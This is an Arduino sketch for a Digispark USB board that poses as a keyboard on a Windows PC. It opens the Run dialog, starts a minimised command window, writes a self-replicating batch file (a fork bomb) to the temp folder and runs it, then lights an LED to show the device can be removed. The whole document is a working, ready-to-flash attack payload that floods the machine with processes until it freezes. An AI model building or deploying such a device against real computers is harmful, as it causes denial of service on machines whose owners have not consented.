#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
  DigiKeyboard.delay(500);
  DigiKeyboard.println("(echo :ouch && echo start ouch.bat && echo goto ouch) > %temp%/ouch.bat"); //Creating payload in temporary dir
  DigiKeyboard.delay(300);  
  DigiKeyboard.println("cd %temp% && ouch.bat"); //executing the payload
  DigiKeyboard.delay(500);   

  digitalWrite(1, HIGH); //turn on led when program finishes - You can unplug now
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
}
